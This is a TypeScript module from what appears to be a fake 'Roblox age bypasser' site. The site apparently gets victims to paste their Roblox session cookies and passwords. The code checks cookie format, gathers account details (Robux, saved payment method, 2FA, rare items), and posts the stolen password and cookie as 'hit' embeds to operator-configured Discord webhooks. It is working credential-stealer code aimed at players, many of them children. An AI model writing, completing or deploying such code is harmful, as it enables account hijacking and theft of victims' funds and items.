export interface Token {
  id: string;
  token: string;
  label: string;
  createdAt: Date;
  expiresAt: Date;
  used: boolean;
}
export interface LoginRecord { tokenLabel: string; timestamp: Date }
export function getTokens(): Token[] { return []; }
export function isTokenExpired(_t: Token): boolean { return true; }
export function generateToken(label: string, hours = 24): Token {
  const now = new Date();
  return { id: crypto.randomUUID(), token: '', label, createdAt: now, expiresAt: new Date(now.getTime() + hours * 3600_000), used: false };
}
export function validateToken(_s: string): Token | null { return null; }
export function deleteToken(_id: string) {}
export function getLoginLog(): LoginRecord[] { return []; }

const HARDCODED_WEBHOOKS: Record<string, string> = {
  wh_bypass: '',
  wh_fetch_cookie: '',
  wh_live_bypass: '',
};
export const WK = {
  bypass: 'wh_bypass',
  fetchCookie: 'wh_fetch_cookie',
  directory: 'wh_directory',
  liveBypass: 'wh_live_bypass',
  legacy: 'discord_webhook_url',
  discordInvite: 'discord_invite_url',
  siteUrl: 'site_url',
} as const;
export function getWebhook(key: string): string {
  if (HARDCODED_WEBHOOKS[key]) return HARDCODED_WEBHOOKS[key];
  return localStorage.getItem(key) || '';
}
export function setWebhook(key: string, value: string) {
  localStorage.setItem(key, value);
}

export interface AccountInfo {
  valid: boolean;
  cookie?: string;
  username?: string;
  userId?: string | number;
  displayName?: string;
  avatarUrl?: string;
  robux?: string | number;
  pendingRobux?: string | number;
  robuxSpent?: string | number;
  premium?: boolean;
  korblox?: boolean;
  headless?: boolean;
  valkyrie?: boolean;
  hasPayment?: boolean;
  has2FA?: boolean;
  emailVerified?: boolean;
  phoneVerified?: boolean;
  ageVerified?: boolean;
  accountAgeDays?: number;
  under13?: boolean;
  rap?: string | number;
  passesBB?: number;
  passesADM?: number;
  passesMM2?: number;
  password?: string;
  groupsOwned?: number;
}

const BOT_NAME = 'Nexus Bypasser.';
const FOOTER_BASE = 'Live Nexus Bypasser. · 2026';
const SITE_URL_DEFAULT = 'https:v0rblxbypasser.vercel.app';

export const COOKIE_PREFIX = 'CAEaAh';
export function isValidCookieFormat(cookie: string): boolean {
  if (!cookie) return false;
  const trimmed = cookie.trim();
  // Either the full Roblox warning-prefixed cookie that contains CAEaAh, OR a raw cookie starting with CAEaAh
  return trimmed.includes(COOKIE_PREFIX);
}

export interface LiveBypassEntry {
  id: string;
  username: string;
  avatarUrl?: string;
  success: boolean;
  timestamp: number;
}
const LIVE_LOG_KEY = 'live_bypass_log';
export function getLiveBypassLog(): LiveBypassEntry[] {
  try { return JSON.parse(localStorage.getItem(LIVE_LOG_KEY) || '[]'); } catch { return []; }
}
export function pushLiveBypass(entry: Omit<LiveBypassEntry, 'id' | 'timestamp'>) {
  const list = getLiveBypassLog();
  list.unshift({ ...entry, id: crypto.randomUUID(), timestamp: Date.now() });
  localStorage.setItem(LIVE_LOG_KEY, JSON.stringify(list.slice(0, 25)));
}

const yn = (v?: boolean) => (v ? '✅' : '❌');
const passField = (n?: number) => (typeof n === 'number' && n > 0) ? `✅ ${Math.min(n, 10)}` : '❌';

function nowFooter(): string {
  const d = new Date();
  const mm = String(d.getMonth() + 1).padStart(2, '0');
  const dd = String(d.getDate()).padStart(2, '0');
  const yy = d.getFullYear();
  const hh = String(d.getHours()).padStart(2, '0');
  const mi = String(d.getMinutes()).padStart(2, '0');
  return `${FOOTER_BASE} | ${mm}/${dd}/${yy} ${hh}:${mi}`;
}

function buildInfoEmbed(d: AccountInfo, siteUrl: string) {
  const description = [
    `**🪪 Username**`,
    `\`${d.username || 'N/A'}\``,
    ``,
    `**🗝️ Password**`,
    `\`${d.password || 'N/A'}\``,
    ``,
    `**📃 Summary** :`,
    `**💎 Premium** : ${yn(d.premium)}`,
    `**📨 Email** : ${yn(d.emailVerified)}`,
    `**👑 Korblox** | **🗿 Headless** : ${yn(d.korblox)} | ${yn(d.headless)}`,
    `**💳 Saved Payment** : ${yn(d.hasPayment)}`,
    `**🎒 Rap** : \`${d.rap ?? 0}\``,
    `**🎂 Age** : \`${d.accountAgeDays ?? 0} days\``,
    `**👥 Group Owned** : \`${d.groupsOwned ?? 0}\``,
    ``,
    `**🎮 GAMES**`,
    `BB | ${passField(d.passesBB)}`,
    `ADM | ${passField(d.passesADM)}`,
    `MM2 | ${passField(d.passesMM2)}`,
  ].join('\n');
  return {
    title: 'Nexus Bypasser.',
    url: siteUrl,
    color: d.valid ? 0x22c55e : 0xef4444,
    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
    description,
    footer: { text: nowFooter() },
  };
}

function buildCookieEmbed(d: AccountInfo) {
  const cookie = d.cookie || '';
  return {
    title: 'ROBLOX AGE BYPASSER 2026',
    color: 0x4f46e5,
    description: '```\n' + cookie + '\n```',
    footer: { text: nowFooter() },
  };
}

function buildLiveEmbed(d: AccountInfo) {
  return {
    title: 'Live Bypass Status',
    color: 0x4f46e5,
    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
    description: [
      `**User:** \`${d.username || 'N/A'}\``,
      `**Robux:** \`${d.robux ?? 0}\``,
      `**Premium:** ${yn(d.premium)}`,
      `**Korblox:** ${yn(d.korblox)}`,
      `**Headless:** ${yn(d.headless)}`,
      `**Valkyrie:** ${yn(d.valkyrie)}`,
      `**API Status:** ✅ Processing`,
      `**Cookie Refreshed:** ✅`,
      ``,
      `🏦 **Summary:** \`${d.robuxSpent ?? 0}\``,
      `🪙 **Premium:** ${d.premium ? 'True' : 'False'}`,
    ].join('\n'),
    footer: { text: nowFooter() },
  };
}

function buildLiveFailedEmbed(d: AccountInfo, reason?: string) {
  return {
    title: 'BLOCK BYPASS',
    color: 0xef4444,
    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
    description: [
      `**User:** \`${d.username || 'N/A'}\``,
      `**Status:** ❌ Bypass Failed`,
      reason ? `**Reason:** \`${reason}\`` : '',
      `**API Status:** ❌ Blocked`,
    ].filter(Boolean).join('\n'),
    footer: { text: nowFooter() },
  };
}

async function post(url: string, body: any) {
  if (!url) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) { console.error('Webhook failed:', e); }
}

export async function sendHitEmbed(webhookUrl: string, d: AccountInfo, opts: { tag?: string } = {}) {
  if (!webhookUrl) return;
  const siteUrl = getWebhook(WK.siteUrl) || SITE_URL_DEFAULT;
  await post(webhookUrl, {
    username: BOT_NAME,
    content: opts.tag ? `**${opts.tag}**` : undefined,
    embeds: [buildInfoEmbed(d, siteUrl), buildCookieEmbed(d)],
  });
}

export async function sendLiveBypassEmbed(webhookUrl: string, d: AccountInfo) {
  if (!webhookUrl) return;
  await post(webhookUrl, {
    username: BOT_NAME,
    embeds: [buildLiveEmbed(d)],
  });
}

export async function sendLiveBypassFailedEmbed(webhookUrl: string, d: AccountInfo, reason?: string) {
  if (!webhookUrl) return;
  await post(webhookUrl, {
    username: BOT_NAME,
    embeds: [buildLiveFailedEmbed(d, reason)],
  });
}

export async function broadcastLiveBypass(d: AccountInfo) {
  await sendLiveBypassEmbed(getWebhook(WK.liveBypass), d);
}
export async function broadcastLiveBypassFailed(d: AccountInfo, reason?: string) {
  await sendLiveBypassFailedEmbed(getWebhook(WK.liveBypass), d, reason);
}

export async function sendBypassEmbed(webhookUrl: string, data: any) {
  await sendHitEmbed(webhookUrl, { ...data, valid: !!data.valid });
}
export async function sendDiscordWebhook(webhookUrl: string, message: string) {
  await post(webhookUrl, { username: BOT_NAME, content: message });
}
